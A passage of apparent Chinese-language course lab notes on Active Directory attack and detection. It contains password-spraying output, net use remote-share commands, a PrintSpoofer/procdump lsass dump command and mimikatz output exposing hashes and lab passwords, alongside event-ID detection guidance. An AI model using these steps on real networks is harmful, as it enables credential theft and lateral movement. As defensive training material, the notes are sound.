kuma.org\\casi.hyacinth:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\cassondra.lothario:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\celeste.kelci:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\charis.kory:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\christi.nettle:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\coraline.mahalia:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\corine.celesta:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\cyndie.rhodie:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\daile.odetta:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\darlleen.dorisa:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\DefaultAccount:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\dollie.fayina:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\dominica.carmon:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\dorrie.paolina:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\eba.luca:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\ella.randee:Changeme123! STATUS_PASSWORD_MUST_CHANGE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\erena.elinore:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\fara.iseabal:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\fred.carmita:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\gabriel.diannne:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\garnet.constancia:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\gertrude.felecia:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\gillian.marsiella:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\giulietta.moyra:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\glenda.dorrie:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\Guest:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\henrieta.sabine:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\herminia.debby:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\issy.eudora:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\jerrie.morganne:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\jessa.corinna:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\jori.floria:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\joyann.sibella:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\kaja.brenda:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\karoly.nadeen:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\katee.annemarie:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\katharina.alyssa:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\kiri.kath:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\kizzee.margaux:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\krbtgt:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\laurena.mirelle:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\lazaro.karoly:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\lilas.lindy:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\lily.kristofor:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\lina.allene:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\linda.neda:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\logan.janeen:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\lon.sonni:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\lorne.celie:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\lucilia.lelah:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\margo.sharl:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\marlyn.loralee:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\marney.ranee:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\martita.juanita:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\marylynne.susannah:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\maurizia.ines:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\mercy.edi:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\moyra.fanechka:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\nolana.rivy:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\ollie.dorita:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\orelee.peri:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\ortensia.fancy:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\philippa.eugenie:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\philis.gilli:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\pietra.fern:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\randene.lelah:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\ranee.delinda:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\reina.claire:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\renae.babette:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\reyna.gwendolyn:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\ricca.stefa:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\ronni.kristoforo:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\rosetta.lotta:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\ruthann.britta:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\ruthie.ebony:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\seana.jeanette:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\selestina.cassi:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\shantee.marylin:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\sherri.jacquetta:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\sile.rhiamon:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\sofie.darlleen:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\star.rikki:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\stormie.natala:Changeme123! STATUS_LOGON_FAILURE 由於這個密碼的spraying結果沒有像前面兩個這麼明確，只有ella.randee的結果與別人不一樣，我不確定是不是command下錯之類的，但結果只有這樣 ::: :::spoiler Result of ncc1701\ncrackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p ncc1701 SMB 192.168.222.129 445 DESKTOP-G95U93T [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False) SMB 192.168.222.128 445 WIN-818G5VCOLJO [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True) SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\Administrator:ncc1701 STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [+] kuma.org\\aleda.appolonia:ncc1701 SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\Administrator:ncc1701 STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [+] kuma.org\\aleda.appolonia:ncc1701 最後結果顯示是aleda.appolonia這個使用者的密碼為ncc1701 :::\n"},{"id":211,"href":"/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x24smb%E9%81%A0%E7%AB%AF%E8%AE%80%E5%AF%AB/","title":"NTUSTISC - AD Note - Lab(SMB遠端讀寫)","section":"Securities","content":" NTUSTISC - AD Note - Lab(SMB遠端讀寫) # [TOC]\nLecture Video: 2022/05/11 AD 安全 2 Lab # 這個lab主要和之前不太一樣的地方在於都是利用SMB的功能達到遠端電腦讀寫的效果，雖然遠端執行也可以做到，但這樣會比較方便\n==遠端讀寫(w/ GUI)== # Open File Explorer Enter \\\\\u0026lt;IP\u0026gt;\\c$ For example: \\\\192.168.222.128\\c$ Login Local Admin Result 我在Win10中利用上述步驟，成功讀取到Win2016的資料 ==遠端讀寫(w/o GUI)== # 沒有GUI的情況就需要先掛載遠端的C槽在本地端，然後才可以進行後續的讀寫，有時候他會跳出錯誤\nCheat Sheet $ net use \\\\\u0026lt;IP\u0026gt;\\C$ \u0026#34;\u0026lt;password\u0026gt;\u0026#34; /user:\u0026lt;username\u0026gt; :::spoiler Result $ net use \\\\192.168.222.128\\C$ \u0026#34;1qaz@WSX3edc\u0026#34; /user:administrator # 掛載遠端磁碟 命令已經成功完成。 $ net use # 查看已掛載的遠端磁碟 會記錄新的網路連線。 狀態 本機 遠端 網路 ------------------------------------------------------------------------------- OK \\\\192.168.222.128\\C$ Microsoft Windows Network 命令已經成功完成。 $ copy Rubeus.exe \\\\192.168.222.128\\C$ 複製了 1 個檔案。 可以看到Win2016的C槽中多了一個Rubeus.exe的檔案，代表成功 ::: ==How to Detect SMB Access== # Event ID: 5145 預設不開，因為會有大量的event湧入，除非設定有存取c$的filter，就會少非常多，因為遠端存取c槽本身就蠻可疑的，所以偵測到非法存取的機率就蠻高的\n==組合技== # 利用SMB開進去遠端檔案總管，然後把procdump.exe送過去(忘記procdump.exe可以複習一下NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)) 使用psexec.exe遠端執行procdump.exe就可以取得lsass的memory dump 再利用SMB把dump result取回本機 在本地端使用mimikatz以便取得更多密碼 "},{"id":212,"href":"/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/","title":"NTUSTISC - AD Note - Lab(偵測LSASS)","section":"Securities","content":" NTUSTISC - AD Note - Lab(偵測LSASS) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # 得到更高權限之後，會想要更多的密碼\n密碼收集 SAM.hive(Security Account Manager) Password Spraying(用猜的) GPO 記憶體(lsass) How to detect LSASS access? 利用Sysmon這個工具中有設定的event ID: 10，這個工具類似Event Viewer但更多元更強，下載可見Sysmon How to install? 簡單來說它需要先準備一個config file，然後安裝的時候就會一起把config設定好(每一間公司或每一個人都不一樣，算是機密) $ Sysmon64.exe -i sysmonconfig-export.xml Lab # ==偵測LSASS== # 利用Sysmon Event ID: 10\n準備sysmonconfig 就像前面說的，每一間公司的sysmonconfig都是機密，所以我們這次的lab，講師也有準備簡易的sysmonconfig \u0026lt;Sysmon schemaversion=\u0026#34;4.1\u0026#34;\u0026gt; \u0026lt;HashAlgorithm\u0026gt;SHA256\u0026lt;/HashAlgorithm\u0026gt; \u0026lt;EventFiltering\u0026gt; \u0026lt;ProcessAccess default=\u0026#34;include\u0026#34;\u0026gt; \u0026lt;/ProcessAccess\u0026gt; \u0026lt;/EventFiltering\u0026gt; \u0026lt;/Sysmon\u0026gt; 安裝Sysmon 按照前面提到的指令，並把sysconfig準備好 $ Sysmon64.exe -i sysmonconfig-export.xml System Monitor v15.0 - System activity monitor By Mark Russinovich and Thomas Garnier Copyright (C) 2014-2023 Microsoft Corporation Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved. Sysinternals - www.sysinternals.com Loading configuration file with schema version 4.10 Sysmon schema version: 4.90 :::warning 實作中這邊遇到問題，理論上準備好sysmonconfig之後下command應該會安裝，但他只跑到一半就結束了，不確定是不是因為沒有連網還是其他設定沒有做好，總之，sysmon算是不能用了，所以之後還有其他的lab會用到就只能跳過 ::: Skip "},{"id":213,"href":"/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/","title":"NTUSTISC - AD Note - Lab(偵測密碼揮灑)","section":"Securities","content":" NTUSTISC - AD Note - Lab(偵測密碼揮灑) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # 得到更高權限之後，會想要更多的密碼\n密碼收集 SAM.hive(Security Account Manager) Password Spraying(用猜的) 和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來 Tool: CrackMapExec - 結合各種功能的內網滲透神器 GPO 記憶體(lsass) Lab # ==Lab: How to detect Password Spraying== # 利用Event ID: 4625, 4648, 4771的認證失敗紀錄 可以看到我是大約在4:52:08左右執行的，有一大堆的4625紀錄，如果抓最後一筆的紀錄，會顯示Account Name就是我們在Kali看到的最後一個帳戶，而且Keyword顯示Audit Failure "},{"id":214,"href":"/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x11%E5%81%B5%E6%B8%AC%E6%8F%90%E6%AC%8A/","title":"NTUSTISC - AD Note - Lab(偵測提權)","section":"Securities","content":" NTUSTISC - AD Note - Lab(偵測提權) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # 提權方法 利用弱點 Hijack Token Guess Password 管理服務 錯誤配置 Lab Time - 本地提權 # ==偵測Network Service提權== # 利用Event ID: 4624\n類型: 5 虛擬帳戶: 是 提高權限的權杖: 是 這樣的rule會有高機率命中，但經過實測會發現他不會顯示出類型5和虛擬帳戶為是的event，只有類型3會被顯示出來，如下圖 "},{"id":215,"href":"/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x05%E5%81%B5%E6%B8%AC%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%93%8D%E4%BD%9C/","title":"NTUSTISC - AD Note - Lab(偵測查詢的操作)","section":"Securities","content":" NTUSTISC - AD Note - Lab(偵測查詢的操作) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nLab Time - 環境調查 # ==Lab - How to observe they\u0026rsquo;ve audited the record?== # 像前面說的，如果在群組的user要觀察ad的name, description之類的，要如何觀察到他們正在做的事情?可以利用==Windows Event ID: 4662==，這個event ID會針對所有user對LDAP的查詢進行log，這樣不管是誰進行查詢都會留下紀錄，但是事先要啟用(預設不開)\nGPO(Group Policy Object)啟動相關事件稽核 在Win2016一開機會啟動Server Manager，其中的Tools/Group Policy Management 點選進去後在Forest:kuma.org/Domains/kuma.org/Default Domain Policy按右鍵選取Edit就會看到==Group Policy Management Editor== 接著在Group Policy Management Editor/Computer Configuration/Policies/Windows Settings/Security Settings/Local Policies/Audit Policy中可以找到==Audit directory service access Properties==，勾選起來就可以了 使用者管理開啟進階功能\n接下來要設定哪些使用者的這些行為要被稽核，首先打開Windoes Startup中有一個==Active Directory Users and Computers== 進入View中把Advanced Features功能打開 接著左邊的列表會出現一些東西，包含Users，我們右鍵Users選擇屬性，並進入Security/Advanced/Auditing 進行新增，最上面的Principle直接打Everyone就可以了，代表任何人，下面的Permission勾選List Contents 這一連串的操作就代表，任何人只要在kuma這個網域底下進行List Content的操作，AD DC都會偵測到進行紀錄 :::spoiler Result 稍微解釋一下，做邊是kuma.org網域的bear帳戶，在右下角有顯示時間為12:37，此時進行net user /domain的操作，而右邊是DC，我們利用Event Viewer進行查看Event ID: 4662中的確記錄到此次event，而查詢的帳號也的確是bear ::: "},{"id":216,"href":"/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/","title":"NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)","section":"Securities","content":" NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # 有了Mimikatz也不一定能夠用，因為Windows的defender也知道這是個好用的東西，對於攻擊方而言，所以會盡可能的直接刪除，那要怎麼bypass或用其他方法把LSASS帶走?\nLab # ==Take LSASS with other ways== # 方法一 # 在windows工作管理員中，找到Local Security Authority Process(LSASS)，右鍵選==建立傾印檔案==，就可以直接dump memory，然後再把這一份檔案丟到自己可以開mimikatz的電腦，就可以分析了，會有一樣的效果 方法二 # 如果沒有GUI的話，也可以考慮直接使用Procdump，當然你必須要取得足夠的權限，要不就是用前面提到的IIS提權執行指令，不然就直接切換administrator帳戶，我是用前者 Command: c:\\tools\\PrintSpoofer64.exe -c \u0026quot;c:\\windows\\system32\\cmd.exe /c c:\\tools\\Procdump\\procdump.exe -accepteula -ma lsass.exe lsass.dmp \u0026gt; c:\\inetpub\\wwwroot\\tmp.txt\u0026quot; 可以看到它放在C:\\Windows\\system32\\lsass.dmp中\n透過Minidump獲取資訊 # 有了前面的lsass.dmp，就可以繼續使用mimikatz得到一些有用的資訊，只是，指令稍微有點不太一樣，因為我們不用對lsass進行debug\n$ Sekurlsa::minidump \u0026#34;\u0026lt;path to lsass.dmp\u0026gt;\u0026#34; $ Sekurlsa::logonPasswords :::spoiler Result\nmimikatz # Sekurlsa::minidump \u0026#34;C:\\Windows\\system32\\lsass.dmp\u0026#34; Switch to MINIDUMP : \u0026#39;C:\\Windows\\system32\\lsass.dmp\u0026#39; mimikatz # log Using \u0026#39;mimikatz.log\u0026#39; for logfile : OK mimikatz # Sekurlsa::logonPasswords Opening : \u0026#39;C:\\Windows\\system32\\lsass.dmp\u0026#39; file for minidump... Authentication Id : 0 ; 2913881 (00000000:002c7659) Session : Service from 0 User Name : DefaultAppPool Domain : IIS APPPOOL Logon Server : (null) Logon Time : 2023/9/5 上午 11:49:20 SID : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415 msv : [00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg : wdigest : * Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos : * Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF ssp : credman : cloudap : Authentication Id : 0 ; 2569783 (00000000:00273637) Session : CachedInteractive from 1 User Name : Administrator Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/9/5 上午 11:39:37 SID : S-1-5-21-306106713-2531972042-334329499-500 msv : [00000003] Primary * Username : Administrator * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : cf967ea9c9c0f9d58b79fdd040270648 tspkg : wdigest : * Username : Administrator * Domain : kuma * Password : (null) kerberos : * Username : Administrator * Domain : KUMA.ORG * Password : 1qaz@WSX3edc ssp : credman : cloudap : Authentication Id : 0 ; 1145006 (00000000:001178ae) Session : CachedInteractive from 1 User Name : Administrator Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/9/5 上午 12:43:30 SID : S-1-5-21-306106713-2531972042-334329499-500 msv : [00000003] Primary * Username : Administrator * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : cf967ea9c9c0f9d58b79fdd040270648 tspkg : wdigest : * Username : Administrator * Domain : kuma * Password : (null) kerberos : * Username : Administrator * Domain : KUMA.ORG * Password : 1qaz@WSX3edc ssp : credman : cloudap : Authentication Id : 0 ; 419256 (00000000:000665b8) Session : Interactive from 1 User Name : bear Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/9/5 上午 12:29:31 SID : S-1-5-21-306106713-2531972042-334329499-2101 msv : [00000003] Primary * Username : bear * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : 4057a0d0b94378dd03224e8b3d28a006 tspkg : wdigest : * Username : bear * Domain : kuma * Password : (null) kerberos : * Username : bear * Domain : KUMA.ORG * Password : (null) ssp : credman : cloudap : Authentication Id : 0 ; 995 (00000000:000003e3) Session : Service from 0 User Name : IUSR Domain : NT AUTHORITY Logon Server : (null) Logon Time : 2023/9/5 上午 12:22:35 SID : S-1-5-17 msv : tspkg : wdigest : * Username : (null) * Domain : (null) * Password : (null) kerberos : ssp : credman : cloudap : Authentication Id : 0 ; 997 (00000000:000003e5) Session : Service from 0 User Name : LOCAL SERVICE Domain : NT AUTHORITY Logon Server : (null) Logon Time : 2023/9/5 上午 12:22:24 SID : S-1-5-19 msv : tspkg : wdigest : * Username : (null) * Domain : (null) * Password : (null) kerberos : * Username : (null) * Domain : (null) * Password : (null) ssp : credman : cloudap : Authentication Id : 0 ; 70310 (00000000:000112a6) Session : Interactive from 1 User Name : DWM-1 Domain : Window Manager Logon Server : (null) Logon Time : 2023/9/5 上午 12:22:24 SID : S-1-5-90-0-1 msv : [00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg : wdigest : * Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos : * Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF ssp : credman : cloudap : Authentication Id : 0 ; 70283 (00000000:0001128b) Session : Interactive from 1 User Name : DWM-1 Domain : Window Manager Logon Server : (null) Logon Time : 2023/9/5 上午 12:22:24 SID : S-1-5-90-0-1 msv : [00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg : wdigest : * Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos : * Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF ssp : credman : cloudap : Authentication Id : 0 ; 996 (00000000:000003e4) Session : Service from 0 User Name : DESKTOP-G95U93T$ Domain : kuma Logon Server : (null) Logon Time : 2023/9/5 上午 12:22:21 SID : S-1-5-20 msv : [00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg : wdigest : * Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos : * Username : desktop-g95u93t$ * Domain : KUMA.ORG * Password : (null) ssp : credman : cloudap : Authentication Id : 0 ; 46383 (00000000:0000b52f) Session : Interactive from 0 User Name : UMFD-0 Domain : Font Driver Host Logon Server : (null) Logon Time : 2023/9/5 上午 12:22:20 SID : S-1-5-96-0-0 msv : [00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg : wdigest : * Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos : * Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF ssp : credman : cloudap : Authentication Id : 0 ; 46347 (00000000:0000b50b) Session : Interactive from 1 User Name : UMFD-1 Domain : Font Driver Host Logon Server : (null) Logon Time : 2023/9/5 上午 12:22:20 SID : S-1-5-96-0-1 msv : [00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg : wdigest : * Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos : * Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : 